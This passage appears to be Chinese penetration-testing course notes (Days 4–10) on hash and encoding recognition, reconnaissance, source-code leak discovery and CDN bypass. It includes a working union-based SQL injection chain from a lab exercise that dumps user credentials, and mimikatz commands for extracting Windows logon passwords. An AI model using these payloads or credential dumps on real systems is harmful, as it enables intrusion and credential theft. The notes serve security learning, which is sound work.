title="#环境配置:"></a>#环境配置:</h4><p>1、安卓模拟器安装搭建</p><p>逍遥，雷电，夜神等自行百度下载安装</p><p>2、工具相关证书安装指南<br>Charles<br><a href="http://t.csdnimg.cn/Qpuxc">http://t.csdnimg.cn/Qpuxc</a></p><p><a href="https://blog.csdn.net/weixin45459427/article/details/108393878">https://blog.csdn.net/weixin45459427/article/details/108393878</a></p><p>Fidder<br><a href="https://blog.csdn.net/weixin_45043349/article/details/120088449">https://blog.csdn.net/weixin_45043349/article/details/120088449</a></p><p>BurpSuite<br><a href="https://blog.csdn.net/qg36658099/article/details/81487491">https://blog.csdn.net/qg36658099/article/details/81487491</a></p><p>1、为什么要抓包?-抓包应用的资产信息进行安全测试</p><p>2、抓包对象有那些?-小程序,APP,桌面应用等</p><p>3、抓包协议区别工具?-有部分应用不走HITP&#x2F;S，需要用到全局协议抓包</p><p>4、封包和抓包不同之处? 零散整体的区别，封包能精确到每个操作的数据包</p><h1 id="Day4：30余种加密编码进制-Web-数据库-系统-代码-参数值"><a href="#Day4：30余种加密编码进制-Web-数据库-系统-代码-参数值" class="headerlink" title="Day4：30余种加密编码进制_Web_数据库_系统_代码_参数值"></a>Day4：30余种加密编码进制_Web_数据库_系统_代码_参数值</h1><h2 id="知识点-2"><a href="#知识点-2" class="headerlink" title="#知识点:"></a>#知识点:</h2><p>1、存储密码加密-web&amp;数据库&amp;系统</p><p>2、传输数据编码-各类组合传输参数值</p><p>3、代码特性加密-JSPHPNETEJAVA</p><p>4、数据显示编码-字符串数据显示编码</p><h2 id="本课意义"><a href="#本课意义" class="headerlink" title="#本课意义:"></a>#本课意义:</h2><p>1.了解加密编码进制在安全测试中的存在</p><p>2.掌握常见的加密解密编码解码进制互转的操作</p><p>3.了解常见的加密解密编码解密进制互转的影够</p><p>旨在解决类似疑问，提供思路:</p><p>你是否碰到不知道的加密方式?</p><p>你是否碰到无法找到的解密平台?</p><p>你是否碰到不知道如何解密的字符串?</p><p>你是否准备参加CTF比赛补充此类知识点?</p><h2 id="详细点："><a href="#详细点：" class="headerlink" title="#详细点："></a>#详细点：</h2><h3 id="密码存储加密"><a href="#密码存储加密" class="headerlink" title="密码存储加密"></a>密码存储加密</h3><p>MD5 H1S  RMD5值是32位由数字”0-9”和字母”a-f”所组成的字符串</p><p>SHA1这种加密的密文特征跟MD5差不多，只不过位数是40</p><p>NTLM这种加密是windows的哈希密码，标准通讯安全协议</p><p>AES，DES，RC4这些都是非对称性加密算法，引入密钥，密文特征与Base64类似</p><p>应用场录:各类应用密文，自定义算法，代码分析，CrE安全比赛等</p><h3 id="传输数据编码"><a href="#传输数据编码" class="headerlink" title="传输数据编码:"></a>传输数据编码:</h3><p>BASE64 URL HEX ASCII</p><p>BASE64值是由数字”0-9”和字母”a-f”所组成的字符串,大小写敏感,结尾通常有符号&#x3D;</p><p>URI编码是由数字”0-9”和字母”a-f”所组成的字符串,大小写敏感,通常以&amp;数字字母间隔</p><p>HEX编码是计算机中数据的一种表示方法,将数据进行十六进制转换，它由0-9，A-F组成</p><p>ASCII编码是将128个字符进行进制数来表示，常见ASCII码表大小规则:0<del>9&lt;A</del>z&lt;a</p><h3 id="举例"><a href="#举例" class="headerlink" title="举例:"></a>举例:</h3><p>个人博客-URL解码</p><p>国外WEB-BASE64解码</p><p>搜狐视频-BASE64解码</p><p>应用场景:参数传递(如注入影响)，后期WAF绕过干扰写法应用，视频地址还原等</p><h3 id="js前端代码加密："><a href="#js前端代码加密：" class="headerlink" title="js前端代码加密："></a>js前端代码加密：</h3><p>Js颜文字 jother JSFUCK</p><p>颜文字特征:一堆颜文字构成的1代码，在12中可直接解密执行</p><p>jother特征:只用 !  + ( )[ ]{ }这八个字符就能完成对任意字符串的编码。也可在F12中解密执行</p><p>JSFUCK特征:与jother很像，只是少了{ }</p><h3 id="后端代码加密"><a href="#后端代码加密" class="headerlink" title="后端代码加密:"></a>后端代码加密:</h3><p>PHP NET JAVA</p><p>PHP:乱码，头部有信息</p><p>.NEI:DLL封装代码文件</p><p>JAVA:JAVACLASS文件</p><p>举例:zend ILSPY IDEA （zend php文件打开是乱码，通过文件头信息判断）</p><p>应用场景:版权代码加密，开发特性，CTF比赛等</p><h3 id="数据库密文加密"><a href="#数据库密文加密" class="headerlink" title="数据库密文加密:"></a>数据库密文加密:</h3><p>MYSQL MSSQL等</p><p> mysql-&gt;user-&gt;密码也可以在cmd5解密</p><h3 id="数据显示编码："><a href="#数据显示编码：" class="headerlink" title="数据显示编码："></a>数据显示编码：</h3><p>UTF-8, GBK2312</p><h3 id="识别算法编码类型："><a href="#识别算法编码类型：" class="headerlink" title="识别算法编码类型："></a>识别算法编码类型：</h3><p>1、看位数</p><p>2、看密文的特征（数字、字母、大小写、符号等）</p><p>3、看当前密文存在的地方（Web、数据库、操作系统等应用）</p><h2 id="演示案例-2"><a href="#演示案例-2" class="headerlink" title="演示案例:"></a>演示案例:</h2><h4 id="Web-ZZCMS-密文-MD5"><a href="#Web-ZZCMS-密文-MD5" class="headerlink" title="Web-ZZCMS-密文-MD5"></a>Web-ZZCMS-密文-MD5</h4><p>这个网站下载源码直接放到www目录下即可，但后面发现nginx的配置里有个文件带有空格，会报错，重新移出来后才没有，还有一个注意点，这个设置主页是最好选到zzcms文件里，不能只到www，因为安装引导时，目录是根目录下的install而不是zzcms下的install，那样403了好久，一直以为权限问题。。。接下来下一步，下一步就好，信息正常填。</p><p><img src="/../image/image-20240322152833066.png" alt="image-20240322152833066"></p><p><img src="/../image/image-20240322152905896.png" alt="image-20240322152905896"></p><p>有两个管理员，然后去数据库里看看密码是如何存储的</p><p><img src="/../image/image-20240322153145609.png" alt="image-20240322153145609"></p><p>去cmd5.com验证一下</p><p><img src="/../image/image-20240322153223102.png" alt="image-20240322153223102"></p><p><img src="/../image/image-20240322153532437.png" alt="image-20240322153532437"></p><h4 id="Web-Discuz-密文-MD5-amp-Salt"><a href="#Web-Discuz-密文-MD5-amp-Salt" class="headerlink" title="Web-Discuz-密文-MD5&amp;Salt"></a>Web-Discuz-密文-MD5&amp;Salt</h4><p>安装Discuz时目录要选到uploads下，然后下一步下一步就是了</p><p><img src="/../image/image-20240322161139610.png" alt="image-20240322161139610"></p><p>注册一个用户看看</p><p><img src="/../image/image-20240322161513691.png" alt="image-20240322161513691"></p><p>然后我们去查是查不到的，需要知道他的盐值</p><pre><code class="php">echo md5(md(&#39;123456&#39;),&quot;d825a3&quot;); --php5.5之前password_hash() --php5.5之后</code></pre><p>但Discuz的加密方式是前一种，去另一个表中查看一下带有盐值的表</p><pre><code class="mysql">select * from pre_ucenter_members;</code></pre><p><img src="/../image/image-20240322163728021.png" alt="image-20240322163728021"></p><p>前面被$包住的就是盐值，但不知道为什么盐值是空的，导出数据库看看。</p><pre><code class="mysql">mysqldump -uroot -proot dbname &gt; dbname.sql</code></pre><p>因为我们这个使用password_hash()返回的值</p><p><img src="/../image/image-20240322165230036.png" alt="image-20240322165230036"></p><p>只能这样验证了</p><p><a href="https://www.mozhe.cn/bug/detail/elRHc1BCd2VIckQxbjduMG9BVCtkZz09bW96aGUmozhe">练习</a></p><p>信息收集</p><p><img src="/../image/image-20240322171623378.png" alt="image-20240322171623378"></p><p><img src="/../image/image-20240322171642952.png" alt="image-20240322171642952"></p><p>主要有上面两个界面，前一个页面时没有注入点的，怎么测试都是正常回显，但后面的页面当输入的id&#x3D;2时，页面会异常回显，说明该页面存在注入点。</p><p>判断类型 id&#x3D;1 and 1&#x3D;2-1，正常回显说明是数字型，判断列数 order by 4，4列</p><p>判断回显位</p><pre><code>id=-1 union select 1,2,3,4 #</code></pre><p><img src="/../image/image-20240322172148784.png" alt="image-20240322172148784"></p><p>下面就是正常的三步走</p><pre><code class="mysql">?id=-1 union select 1,database(),3,4 #?id=-1 union select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=database()?id=-1 union select 1,group_concat(column_name),3,4 from information_schema.columns where table_schema=database() and table_name=&#39;StormGroup_member&#39;?id=-1 union select 1,group_concat(name,&#39;~&#39;,password),3,4 from StormGroup_member</code></pre><p><img src="/../image/image-20240322172245928.png" alt="image-20240322172245928"></p><p><img src="/../image/image-20240322172450975.png" alt="image-20240322172450975"></p><p><img src="/../image/image-20240322172546176.png" alt="image-20240322172546176"></p><p><img src="/../image/image-20240322172704509.png" alt="image-20240322172704509"></p><p><img src="/../image/image-20240322172834903.png" alt="image-20240322172834903"></p><p>猜测密码是md5，cmd5测试一下mozhe-841076</p><p>系统-Windows-密文-NTLM&amp;HASH</p><p>mimikatz要以<strong>管理身份</strong>打开</p><pre><code class="bash">privilege::debugsekurlsa::logonpasswords</code></pre><p><img src="/../image/image-20240322174208878.png" alt="image-20240322174208878"></p><p>同样可以去cmd5验证，但有的也没有</p><h4 id="综合-参数-密文传输-AES-amp-BASE64"><a href="#综合-参数-密文传输-AES-amp-BASE64" class="headerlink" title="综合-参数-密文传输-AES&amp;BASE64"></a><strong>综合-参数-密文传输-AES&amp;BASE64</strong></h4><p><a href="http://tool.chacuo.net/cryptdes%E5%B7%A5%E5%85%B7%E7%BD%91%E7%AB%99">http://tool.chacuo.net/cryptdes工具网站</a></p><p><a href="https://www.mozhe.cn/bug/detail/110">练习</a></p><p><img src="/../image/image-20240322203510007.png" alt="image-20240322203510007"></p><p>注意到参数很长，可能是加密后的参数，信息收集一下</p><p><img src="/../image/image-20240322203621578.png" alt="image-20240322203621578"></p><p>这里是网页源代码，可以下载下来看看</p><p><img src="/../image/image-20240322203805719.png" alt="image-20240322203805719"></p><p>可以看到加密流程，我们搜索一下各个函数的信息</p><p><img src="/../image/image-20240322203855700.png" alt="image-20240322203855700"></p><pre><code class="php">function decode($data)&#123;    $td = mcrypt_module_open(MCRYPT_RIJNDAEL_128,&#39;&#39;,MCRYPT_MODE_CBC,&#39;&#39;);//AES加密，128块，模式CBC    mcrypt_generic_init($td,&#39;ydhaqPQnexoaDuW3&#39;,&#39;2018201920202021&#39;);//前面是密钥，后面是偏移量    $data = mdecrypt_generic($td,base64_decode(base64_decode($data)));//两次base64加密，说明还要解密一次，才能作运算    mcrypt_generic_deinit($td);    mcrypt_module_close($td);    if(substr(trim($data),-6)!==&#39;_mozhe&#39;)&#123;        echo &#39;&lt;script&gt;window.location.href=&quot;/index.php&quot;;&lt;/script&gt;&#39;;    &#125;else&#123;        return substr(trim($data),0,strlen(trim($data))-6);    &#125;&#125;</code></pre><p>先base64解密一次</p><p><img src="/../image/image-20240322204222067.png" alt="image-20240322204222067"></p><p>再去aes解密</p><p><img src="/../image/image-20240322204315425.png" alt="image-20240322204315425"></p><h4 id="代码-解密-解密反编译-Zend-amp-Dll-amp-Jar"><a href="#代码-解密-解密反编译-Zend-amp-Dll-amp-Jar" class="headerlink" title="代码-解密-解密反编译-Zend&amp;Dll&amp;Jar"></a><strong>代码-解密-解密反编译-Zend&amp;Dll&amp;Jar</strong></h4><p>CTF赛题-buuoj-single dog-JS颜文字</p><p>CTF赛题-xuenixiang-Jsfuck-JSFUCK</p><h2 id="补充点"><a href="#补充点" class="headerlink" title="#补充点:"></a>#补充点:</h2><p>1.常见加密编码进制等算法解析</p><p>MD5，SHA，ASC，进制，时间戳，URL，BASE64，Unescape，AES，DES等</p><p>2.常见加密编码形式算法解析</p><p>直接加密，带sa1t，带密码，带偏移，带位数，带模式，带干扰，自定义组合等</p><p>3.常见解密解码方式(针对)</p><p>枚举，自定义逆向算法，可逆向</p><p>4.常见加密解码算法的特性</p><p>长度位数，字符规律，代码分析，搜索获取等</p><h3 id="拓展补充参考盗料"><a href="#拓展补充参考盗料" class="headerlink" title="#拓展补充参考盗料:"></a>#拓展补充参考盗料:</h3><p>部分资源:<br><a href="https://www.cmd5.com/">https://www.cmd5.com</a></p><p><a href="http://tmxk.org/jother">http://tmxk.org/jother</a></p><p><a href="http://www.jsfuck.com/">http://www.jsfuck.com</a></p><p><a href="http://www.hiencode.com/">http://www.hiencode.com</a><br><a href="http://tool.chacuo.net/cryptaes">http://tool.chacuo.net/cryptaes</a></p><p><a href="https://utf-8.jp/public/aanocde.html">https://utf-8.jp/public/aanocde.html</a></p><h1 id="Day5：资产架构-端口-应用-CDN-WAF-站库分离-负载ay均衡"><a href="#Day5：资产架构-端口-应用-CDN-WAF-站库分离-负载ay均衡" class="headerlink" title="Day5：资产架构_端口_应用_CDN_WAF_站库分离_负载ay均衡"></a>Day5：资产架构_端口_应用_CDN_WAF_站库分离_负载ay均衡</h1><h2 id="知识点-3"><a href="#知识点-3" class="headerlink" title="#知识点:"></a>#知识点:</h2><p>1、资产架构-端口&amp;目录&amp;播件接口s多站点&amp;多应用</p><p>2、番外安全-域名&amp;服务器本身&amp;服务厂商:管理人员</p><p>3、考虑阻碍-站库分离&amp;CDN&amp;WAF&amp;负载均衡&amp;主机防护</p><h2 id="详细点"><a href="#详细点" class="headerlink" title="#详细点:"></a>#详细点:</h2><p>1、前置条件-购买使用-云服务器&amp;域名等</p><p>2、架构搭建-目录&amp;端口&amp;子域s插件&amp;应用等</p><p>3、安全部署-WAF防火墙s主机防护sHIDS等</p><p>4、性能优化-负载均衡:CDI加速soss云存储等</p><h2 id="演示案例-3"><a href="#演示案例-3" class="headerlink" title="演示案例:"></a>演示案例:</h2><p>资产架构-BT搭建&amp;多站点&amp;多插件&amp;多应用等</p><p>在之前的服务器的基础上，搭建一个网站</p><p><img src="/../image/image-20240323152352818.png" alt="image-20240323152352818"></p><p><img src="/../image/image-20240323154746404.png" alt="image-20240323154746404"></p><p>没有域名就用自己的ip地址，然后选一个非网站根目录的文件，或自己新建一个文件夹</p><p><img src="/../image/image-20240323154833089.png" alt="image-20240323154833089"></p><p>然后一直下一步，把信息填好就ok了，那个初始化可以不用填</p><p><img src="/../image/image-20240323155029222.png" alt="image-20240323155029222"></p><p>也有可能一个网站里有两个程序，任何一个程序出现漏洞，都可能进入安全测试</p><p>番外安全-Aliyun&amp;域名解析&amp;云服务器&amp;个人等</p><p>考虑阻碍-站库分离&amp;部署防护&amp;负载均衡&amp;CDN等</p><h3 id="资产架构"><a href="#资产架构" class="headerlink" title="#资产架构:"></a>#资产架构:</h3><p>WEB单个源码指向安全</p><p>WEB多个目录源码安全</p><p>WEB多个端口源码安全</p><p>服务器架设多个站点安全</p><p>架设第三方插件接口安全 phpmyadmin之类的，方便管理人员但也给攻击者提供了机会</p><p>服务器架设多个应用安全 ftp之类的</p><h3 id="番外安全"><a href="#番外安全" class="headerlink" title="#番外安全:"></a>#番外安全:</h3><p>基于域名解析安全</p><p>基于服务器本身安全</p><p>基于服务商信息安全</p><p>基于管理个人的安全</p><h3 id="考虑阻碍"><a href="#考虑阻碍" class="headerlink" title="#考虑阻碍:"></a>#考虑阻碍:</h3><p>阻碍-站库分离 数据库放在别的地方</p><p>阻碍-CDN加速服务</p><p><strong>CDN</strong>英文全称<code>Content Delivery Network</code>，中文翻译即为<a href="https://cloud.tencent.com/product/cdn?from_column=20065&from=20065"><strong>内容分发网络</strong></a>。它是建立并覆盖在承载网之上，由分布在不同区域的边缘节点服务器群组成的分布式网络。</p><p>阻碍-<a href="https://blog.csdn.net/wanghangzhen/article/details/118554304">负载均衡服务</a></p><p>就是你最终获取到的是备用服务器信息</p><p>阻碍-WAF应用防火墙</p><p>阻碍-主机防护防火墙</p><h1 id="Day6-信息打点-Web架构篇-域名-语言-中间件-数据库-系统-源码获取"><a href="#Day6-信息打点-Web架构篇-域名-语言-中间件-数据库-系统-源码获取" class="headerlink" title="Day6: 信息打点-Web架构篇_域名_语言_中间件_数据库_系统_源码获取"></a>Day6: 信息打点-Web架构篇_域名_语言_中间件_数据库_系统_源码获取</h1><h2 id="知识点-4"><a href="#知识点-4" class="headerlink" title="#知识点:"></a>#知识点:</h2><p>1、打点-web架构-语言&amp;中间件&amp;数据库&amp;系统等</p><p>2、打点-web源码-CMs开源s闭源售卖&amp;自主研发等</p><p>3、打点-web源码获取-泄露安全&amp;资源监控&amp;其他等</p><p>4、打点-web域名-子域名&amp;相似域名&amp;反查域名&amp;旁注等</p><h2 id="信息点"><a href="#信息点" class="headerlink" title="#信息点:"></a>#信息点:</h2><p>基础信息，系统信息，应用信息，防护信息，人员信息，其他信息等</p><h2 id="技术点"><a href="#技术点" class="headerlink" title="#技术点:"></a>#技术点:</h2><p>cMs识别，端口扫描，CDN绕过，源码获取，子域名查询，wAE识别，负载均衡识别等</p><h2 id="演示案例-4"><a href="#演示案例-4" class="headerlink" title="演示案例:"></a>演示案例:</h2><p>信息打点-个人博客-YOUZIPII-架构&amp;源码</p><p>信息打点-某违法APP-面具约会-架构&amp;源码</p><p>信息打点-某违法应用-爱心工程-架构&amp;域名</p><p>信息打点-某专属SRC-补天平台-架构&amp;域名</p><p><img src="/../image/image-20240325203443839.png" alt="image-20240325203443839"></p><p>根据这个可以查出更多信息，比如中间件推测端口，服务，脚本语言推测常用数据库</p><p><a href="https://blog.csdn.net/zengxianglei/article/details/94357189">关系型和非关系型数据库的区别</a></p><p>mysql 3306 </p><p>mssql 1443 </p><p>oracle 1521 </p><p>redis 6379 </p><p>DB2  5000</p><p>国产DM达梦数据库 5236</p><p>MongoDB 27017</p><p>判断方式也不一定准确。下面是默认操作系统的TTL：<br>1、WINDOWS NT&#x2F;2000   TTL：128<br>2、WINDOWS 95&#x2F;98     TTL：32<br>3、UNIX              TTL：255<br>4、LINUX             TTL：64<br>5、WIN7          TTL：128</p><p><img src="/../image/image-20240325205214933.png" alt="image-20240325205214933"></p><p>源码-直接利用公开的漏洞库尝试安全测试</p><p>源码-白盒代码审计 挖漏洞</p><p>msql漏洞或弱口令</p><p>php常见的漏洞 如log4j</p><h3 id="黑源码"><a href="#黑源码" class="headerlink" title="黑源码"></a>黑源码</h3><p><a href="https://www.huzhan.com/">https://www.huzhan.com/</a><br><a href="https://28xin.com/">https://28xin.com/</a><br><a href="https://bbs.bcb5.com/">https://bbs.bcb5.com/</a><br><a href="https://www.shixinwl.com/">https://www.shixinwl.com/</a><br><a href="https://www.lengcat.com/">https://www.lengcat.com/</a><br><a href="https://www.xlymz.com/">https://www.xlymz.com/</a><br><a href="https://www.ymadx.com/">https://www.ymadx.com/</a><br>……..</p><p>更多针对违法应用源码：<br>可利用fofa和bing、谷歌等搜索关键字获取</p><p><a href="http://www.jmlsd.com/">www.jmlsd.com</a></p><p>子域名：变动www</p><p>变动jmlsd或com为相似域名</p><p><a href="https://www.cnblogs.com/Timeouting-Study/p/16082575.html">jessionid和session</a></p><p>有时候有CDN存在，扫描可能就没那么有用了。</p><h1 id="Day7-信息打点-资产泄漏-CMS识别-Git监控-SVN-DS-Store-备份"><a href="#Day7-信息打点-资产泄漏-CMS识别-Git监控-SVN-DS-Store-备份" class="headerlink" title="Day7:信息打点-资产泄漏_CMS识别_Git监控_SVN_DS_Store_备份"></a>Day7:信息打点-资产泄漏_CMS识别_Git监控_SVN_DS_Store_备份</h1><h2 id="知识点-5"><a href="#知识点-5" class="headerlink" title="#知识点:"></a>#知识点:</h2><p>1、CMS指纹识别源码获取方式</p><p>2、习惯&amp;配置&amp;特性等获取方式</p><p>3、托管资产平台资源搜索监控</p><h2 id="详细点-1"><a href="#详细点-1" class="headerlink" title="#详细点:"></a>#详细点:</h2><p>参考:<a href="https://www.secpulse.com/archives/124398.html%E6%BA%90%E7%A0%81%E6%B3%84%E6%BC%8F%E5%8E%9F%E5%9B%A0">https://www.secpulse.com/archives/124398.html源码泄漏原因</a>:<br>源码泄漏原因:<br>1、从源码本身的特性入口2、从管理员不好的习惯入口<br>3、从管理员不好的配置入口<br>4、从管理员不好的意识入口<br>5、从管理员资源信息搜集入口</p><ul><li>composer.jspn</li><li>git源码泄露</li><li>svn源码泄露</li><li>hg源码泄漏</li><li>网站备份压缩文件</li><li>WEB-INF&#x2F;web.xml泄露文件泄露DSStore</li><li>SwP 文件泄露</li><li>cvs泄露</li><li>Bzr泄露</li><li>GitHub源码泄漏</li></ul><h2 id="演示案例-5"><a href="#演示案例-5" class="headerlink" title="演示案例:"></a>演示案例:</h2><h3 id="直接获取-CMS识别-云悉指纹识别平台"><a href="#直接获取-CMS识别-云悉指纹识别平台" class="headerlink" title="直接获取-CMS识别-云悉指纹识别平台"></a>直接获取-CMS识别-云悉指纹识别平台</h3><p><a href="https://www.yunsee.cn/">云悉指纹</a>,然后下载进行白盒审计</p><h3 id="习惯不好-备份文件-某黑阔博客源码泄漏"><a href="#习惯不好-备份文件-某黑阔博客源码泄漏" class="headerlink" title="习惯不好-备份文件-某黑阔博客源码泄漏"></a>习惯不好-备份文件-某黑阔博客源码泄漏</h3><p>相关利用项目:</p><p>CMS只别:<a href="https://www.yunsee.cn/">https://www.yunsee.cn/</a></p><p>份:敏感目录文件扫描-7kbscan-webPathBrute</p><p>CVs:<a href="https://github.com/kost/dvcs-ripper">https://github.com/kost/dvcs-ripper</a></p><p>GIT: <a href="https://github.com/lijiejie/GitHack">https://github.com/lijiejie/GitHack</a></p><p>SVN:<a href="https://github.com/callmefeifei/SvnHack">https://github.com/callmefeifei/SvnHack</a></p><p>Ds_Store: <a href="https://github.com/lijiejie/ds_store_exp">https://github.com/lijiejie/ds_store_exp</a></p><h3 id="配置不当-GIT泄漏-某程序员博客源码泄漏"><a href="#配置不当-GIT泄漏-某程序员博客源码泄漏" class="headerlink" title="配置不当-GIT泄漏-某程序员博客源码泄漏"></a>配置不当-GIT泄漏-某程序员博客源码泄漏</h3><p>可以试试访问.git目录，存在的话就可以试试利用</p><h3 id="配置不当-SVN泄漏-某国外小伙子源码泄漏"><a href="#配置不当-SVN泄漏-某国外小伙子源码泄漏" class="headerlink" title="配置不当-SVN泄漏-某国外小伙子源码泄漏"></a>配置不当-SVN泄漏-某国外小伙子源码泄漏</h3><h3 id="配置不当-DS-Store泄漏-某开发Mac源码泄漏"><a href="#配置不当-DS-Store泄漏-某开发Mac源码泄漏" class="headerlink" title="配置不当-DS_Store泄漏-某开发Mac源码泄漏"></a>配置不当-DS_Store泄漏-某开发Mac源码泄漏</h3><h3 id="PHP特性-composer-json泄漏-某直接搭建源码泄漏"><a href="#PHP特性-composer-json泄漏-某直接搭建源码泄漏" class="headerlink" title="PHP特性-composer.json泄漏-某直接搭建源码泄漏"></a>PHP特性-composer.json泄漏-某直接搭建源码泄漏</h3><h3 id="下载配合-WEB-INF泄露-RoarCTF-2019-EasyJava"><a href="#下载配合-WEB-INF泄露-RoarCTF-2019-EasyJava" class="headerlink" title="下载配合-WEB-INF泄露-RoarCTF-2019-EasyJava"></a>下载配合-WEB-INF泄露-RoarCTF-2019-EasyJava</h3><p>配合文件下载漏洞</p><h3 id="资源监控-GITHUB泄漏-语法搜索-amp-关键字搜索-amp-社工"><a href="#资源监控-GITHUB泄漏-语法搜索-amp-关键字搜索-amp-社工" class="headerlink" title="资源监控-GITHUB泄漏-语法搜索&amp;关键字搜索&amp;社工"></a>资源监控-GITHUB泄漏-语法搜索&amp;关键字搜索&amp;社工</h3><h1 id="Day8-信息打点-系统篇-端口扫描-CDN服务-负载均衡-WAF防火墙"><a href="#Day8-信息打点-系统篇-端口扫描-CDN服务-负载均衡-WAF防火墙" class="headerlink" title="Day8: 信息打点-系统篇_端口扫描_CDN服务_负载均衡_ WAF防火墙"></a>Day8: 信息打点-系统篇_端口扫描_CDN服务_负载均衡_ WAF防火墙</h1><p><img src="/../image/image-20240329193707328.png" alt="image-20240329193707328"></p><h2 id="知识点-6"><a href="#知识点-6" class="headerlink" title="#知识点:"></a>#知识点:</h2><p>1、获取网络信息-服务厂商&amp;网络架构</p><p>2、获取服务信息-应用协议&amp;内网资产</p><p>不仅对一个ip扫描，可以获取该网段多个ip信息</p><p>然后<a href="https://www.cnblogs.com/wjw-zm/p/11803681.html">端口渗透</a></p><p>3、获取阻碍信息-CDN&amp;WAF&amp;负载&amp;防火墙</p><h2 id="详细点-2"><a href="#详细点-2" class="headerlink" title="#详细点:"></a>#详细点:</h2><p>CDN服务，WAF防火墙，负载均衡，防火墙阻碍?</p><h3 id="相关利用项目"><a href="#相关利用项目" class="headerlink" title="#相关利用项目:"></a>#相关利用项目:</h3><p>Masscan: <a href="https://github.com/robertdavidgraham/masscan">https://github.com/robertdavidgraham/masscan</a></p><p>Wafw00f：<a href="https://github.com/EnableSecurity/wafw00f">https://github.com/EnableSecurity/wafw00f</a></p><p>Kali上自带Nmap，Masscan，1bd等项目，超级ping:ping.chinaz.com</p><p>Masscan:端口扫描，应用协议</p><p>wafw00f:web应用防护防火墙识别</p><p>Nmap:端口扫描，应用协议，防火墙识别</p><p>lbd:负载均衡，广域网负载均衡，应用层负载均衡</p><p>在我们扫描时，有些服务器是由内网提供服务通过映射到外网来让我们访问，这样是扫不到内网的，只有外网，除非获得它的权限，不然是没办法的。</p><p>旁注:同服务器下面的不同WEB应用查询技术</p><p>10.1.1.1</p><p><a href="http://www.123.com/">www.123.com</a> 目标没什么头绪</p><p><a href="http://www.124.com/">www.124.com</a> 那就从别的网站试试</p><p>C段：同网段下面的不同服务器IP下的WEB应用查询技术</p><p>10.1.1.1</p><p><a href="http://www.123.com只有一个网站,没什么头绪,我们就查10.1.1.0/24%E6%89%80%E6%9C%89%E7%9A%84%E7%BD%91%E6%AE%B5%E7%9A%84%E6%9C%8D%E5%8A%A1">www.123.com只有一个网站，没什么头绪，我们就查10.1.1.0/24所有的网段的服务</a></p><p>还有一种ip反查域名的手段</p><h1 id="Day9：信息打点-CDN绕过篇-漏洞回链-接口探针-全网扫描-反向邮件"><a href="#Day9：信息打点-CDN绕过篇-漏洞回链-接口探针-全网扫描-反向邮件" class="headerlink" title="Day9：信息打点-CDN绕过篇_漏洞回链_接口探针_全网扫描_反向邮件"></a>Day9：信息打点-CDN绕过篇_漏洞回链_接口探针_全网扫描_反向邮件</h1><ul><li>CDN知识-工作原理及阻碍</li><li>CDN配置-域名&amp;区域&amp;类型</li><li>CDN绕过-靠谱十余种技战法</li><li>CDN绑定-HOSTS绑定指向访问</li></ul><p>绕过知识点：<br><a href="https://zhuanlan.zhihu.com/p/33440472">https://zhuanlan.zhihu.com/p/33440472</a><br><a href="https://www.cnblogs.com/blacksunny/p/5771827.html">https://www.cnblogs.com/blacksunny/p/5771827.html</a></p><p>超级Ping：<a href="https://www.17ce.com/">https://www.17ce.com/</a><br>接口查询：<a href="https://get-site-ip.com/">https://get-site-ip.com/</a><br>国外请求：<a href="https://tools.ipip.net/cdn.php">https://tools.ipip.net/cdn.php</a><br>全网扫描：<a href="https://github.com/Tai7sy/fuckcdn">https://github.com/Tai7sy/fuckcdn</a></p><p>本地绕过复现：<br>1、备案域名<br>2、开通CDN<br>3、配置CDN</p><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="#前置知识:"></a>#前置知识:</h2><p>1.传统访问:用户访问域名-&gt;解析服务器P-&gt;访问目标主机</p><p>2.普通CDN:用户访问域名-&gt;CDN节点-&gt;真实服务器IP-&gt;访问目标主机</p><p>3.带wAE的CDN:用户访问域名-&gt;CDN节点(WAF)-&gt;真实服务器IP-&gt;访问目标主机</p><h2 id="CDN配置"><a href="#CDN配置" class="headerlink" title="#CDN配置:"></a>#CDN配置:</h2><p>配置1:加速域名-需要启用加速的域名</p><p>配置2:加速区域-需要启用加速的地区</p><p>配置3:加速类型-需要启用加速的资源</p><h2 id="判定标准"><a href="#判定标准" class="headerlink" title="#判定标准:"></a>#判定标准:</h2><p>nslookup，各地ping(出现多个IP即启用CDN服务)</p><h2 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h2><p>1.只加速一个域名<a href="http://www.xx.com,而test.xx.com没有加速/">www.xx.com，而test.xx.com没有加速</a></p><p>2.利用网站漏洞</p><p>3.历史DNS记录，之前没有CDN的历史记录</p><p>4.CDN本身，社工，得到控制面板</p><p>5.MS邮件</p><p>6.国外请求，加速区域在中国内地的时候，国外ip访问的就是真实id了</p><p>7.zmap</p><p>8.网络空间引擎搜索</p><p>演示:</p><p>真实应用-CDN绕过-漏洞&amp;遗留文件</p><p>pipinfo.php文件泄露（多个网卡就没什么用了）</p><p>SSRF:利用服务端访问相应的服务器，例如访问DNSlog，这个方法比较可靠，前提是要有相应的漏洞，当然不包括SSRF，类似的也行，只要能访问相关服务器的即可</p><p>真实应用-CDN绕过-子域名查询操作</p><p>用超级ping ping sp910网站，带www时会发现返回不同ip地址，说明用了CDN，而直接ping sp910.com时就会返回一样的ip</p><p>真实应用-CDN绕过-接口查询国外访问</p><p>一些网站有外国服务器ping对应域名可以得到真实ip，因为有些地方不太可能设置cdn</p><p>真实应用-CDN绕过-主动邮件配合备案</p><p>就是让对方发送邮件给你，比如网站找回密码时，可以看看对方发送给你邮件的邮件服务器，然后查看邮件原文即可</p><p><a href="http://get-site-ip.com/%E9%80%9A%E8%BF%87%E6%8E%A5%E5%8F%A3%E5%88%A4%E6%96%AD%EF%BC%8C%E4%B8%8D%E4%B8%80%E5%AE%9A%E6%AD%A3%E7%A1%AE%EF%BC%8C%E4%B8%8D%E6%8E%A8%E8%8D%90">http://get-site-ip.com/通过接口判断，不一定正确，不推荐</a></p><p>查网站备案可以验证结果</p><p>真实应用-CDN绕过-全网扫描FuckCDN</p><h2 id="hosts绑定ip"><a href="#hosts绑定ip" class="headerlink" title="hosts绑定ip"></a>hosts绑定ip</h2><p>编辑&#x2F;etc&#x2F;hosts文件，绑定ip，这样扫描就不会扫到别地方了</p><h1 id="Day10：信息打点-APP-小程序篇-抓包封包-XP框架-反编译-资产提取"><a href="#Day10：信息打点-APP-小程序篇-抓包封包-XP框架-反编译-资产提取" class="headerlink" title="Day10：信息打点-APP_小程序篇_抓包封包_XP框架_反编译_资产提取"></a>Day10：信息打点-APP_小程序篇_抓包封包_XP框架_反编译_资产提取</h1><h2 